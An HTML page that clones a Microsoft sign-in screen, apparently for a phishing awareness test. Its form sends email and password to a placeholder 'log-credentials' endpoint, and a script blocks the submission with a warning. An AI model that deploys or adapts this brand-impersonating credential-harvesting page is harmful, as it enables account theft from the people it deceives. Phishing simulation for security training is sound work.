<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
        <h2>Sign in</h2>
        <form action="https://your-backend.com/api/log-credentials" method="POST" onsubmit="showWarning(event)">
            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <p><a href="#">Forgot password?</a></p>
        <p><a href="#">No account? Create one!</a></p>
        <p><a href="#">Sign in with a security key</a></p>
    </div>

    <script>
        function showWarning(event) {
            event.preventDefault();
            alert("âš  This is a phishing awareness test. DO NOT enter your real credentials.");
            window.location.href = "https://security.microsoft.com"; // Redirect to real Microsoft Security page
        }
    </script>
</body>
</html>
